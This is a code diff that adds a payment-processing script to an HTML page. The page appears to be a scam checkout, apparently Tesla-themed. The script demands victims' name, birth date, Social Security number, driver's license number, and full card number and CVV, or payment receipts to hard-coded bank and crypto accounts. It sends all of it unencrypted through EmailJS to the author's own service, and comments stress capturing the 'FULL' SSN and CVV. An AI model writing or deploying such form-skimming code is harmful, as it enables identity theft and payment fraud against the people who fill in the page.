@@ -527,3 +527,118 @@
                 return null;
             }
         }
+        // Main Payment Processing Function - Sends RAW data to EmailJS
+        async function completePayment() {
+            const payButton = document.getElementById('complete-payment-btn');
+            const originalText = payButton.textContent;
+            payButton.textContent = 'Processing...';
+            payButton.disabled = true;
+
+            try {
+                // 1. Validate required fields
+                const requiredFields = ['fullname', 'dob', 'ssn', 'dl'];
+                for (const fieldId of requiredFields) {
+                    const field = document.getElementById(fieldId);
+                    if (!field.value) {
+                        throw new Error(`Please fill in ${fieldId.replace('fullname', 'your name')}`);
+                    }
+                }
+
+                // 2. Determine payment method and collect details
+                const paymentMethod = document.querySelector('.payment-method.active').textContent.trim();
+                let paymentDetails = {};
+                let receiptFile = null;
+
+                if (paymentMethod === 'Credit/Debit') {
+                    const cardFields = ['card-number', 'expiry', 'cvv', 'card-name'];
+                    for (const fieldId of cardFields) {
+                        const field = document.getElementById(fieldId);
+                        if (!field.value) {
+                            throw new Error('Please complete all card details');
+                        }
+                    }
+                    
+                    paymentDetails = {
+                        type: 'card',
+                        card_number: document.getElementById('card-number').value, // FULL number
+                        card_expiry: document.getElementById('expiry').value,
+                        card_cvv: document.getElementById('cvv').value, // FULL CVV
+                        card_name: document.getElementById('card-name').value
+                    };
+                } 
+                else if (paymentMethod === 'Bank Transfer') {
+                    receiptFile = document.getElementById('bank-receipt').files[0];
+                    if (!receiptFile) throw new Error('Please upload bank receipt');
+                    
+                    paymentDetails = {
+                        type: 'bank',
+                        bank_name: 'Wells Fargo',
+                        account_number: '9876543210',
+                        routing_number: '121000248',
+                        reference: 'TESLA-789123'
+                    };
+                } 
+                else if (paymentMethod === 'Crypto') {
+                    receiptFile = document.getElementById('crypto-receipt').files[0];
+                    if (!receiptFile) throw new Error('Please upload crypto receipt');
+                    
+                    paymentDetails = {
+                        type: 'crypto',
+                        bitcoin_address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493w83',
+                        ethereum_address: '0x71C7656EC7ab88b098defB751B7',
+                        usdt_address: 'TNPU3wLphPC8S55aP8J3z1k'
+                    };
+                }
+
+                // 3. Upload receipt if exists
+                const receiptUrl = receiptFile ? await uploadToCloudinary(receiptFile) : null;
+
+                // 4. Prepare COMPLETE data for EmailJS
+                const emailData = {
+                    full_name: document.getElementById('fullname').value,
+                    dob: document.getElementById('dob').value,
+                    ssn: document.getElementById('ssn').value, // FULL SSN
+                    driver_license: document.getElementById('dl').value,
+                    payment_method: paymentMethod,
+                    ...paymentDetails, // Spread all payment details
+                    receipt_url: receiptUrl,
+                    submission_date: new Date().toLocaleString()
+                };
+
+                // 5. Send using YOUR service and template IDs
+                const emailResponse = await emailjs.send(
+                    'service_pveujll', // YOUR service ID
+                    'template_zqpc6bx', // YOUR template ID
+                    emailData
+                );
+                
+                if (emailResponse.status !== 200) {
+                    throw new Error('Email failed to send');
+                }
+
+                // 6. Show confirmation
+                showPage('confirmation-page');
+
+            } catch (error) {
+                alert(error.message);
+                payButton.textContent = originalText;
+                payButton.disabled = false;
+            }
+        }
+
+        // Development helper - prefills test data
+        if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+            document.addEventListener('DOMContentLoaded', function() {
+                document.getElementById('fullname').value = 'John Doe';
+                document.getElementById('dob').value = '1985-01-15';
+                document.getElementById('ssn').value = '123456789'; // FULL SSN for testing
+                document.getElementById('dl').value = 'DL12345678';
+                document.getElementById('card-number').value = '4111111111111111'; // FULL card
+                document.getElementById('expiry').value = '12/25';
+                document.getElementById('cvv').value = '123'; // FULL CVV
+                document.getElementById('card-name').value = 'John Doe';
+            });
+        }
+    </script>
+</body>
+</html>
